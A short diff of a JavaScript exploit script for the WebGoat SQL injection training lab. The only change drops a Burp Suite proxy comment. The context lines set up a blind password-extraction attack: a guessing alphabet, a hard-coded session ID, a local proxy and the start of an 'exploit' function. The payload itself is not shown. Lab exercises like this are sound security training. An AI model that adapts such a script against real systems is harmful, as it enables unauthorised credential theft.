@@ -5,7 +5,7 @@ import { ProxyAgent, fetch } from "undici";
 const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789";
 const url = "http://localhost:8080/WebGoat/SqlInjectionAdvanced/register";
 const JSESSIONID = "4F761BD22C1BBC3536455B945540501E"; // Update this with the actual JSESSIONID value.
-const proxyAgent = new ProxyAgent("http://127.0.0.1:8081"); // Burp Suite Proxy
+const proxyAgent = new ProxyAgent("http://127.0.0.1:8081");
 
 async function exploit() {
   let extractedPassword = "";
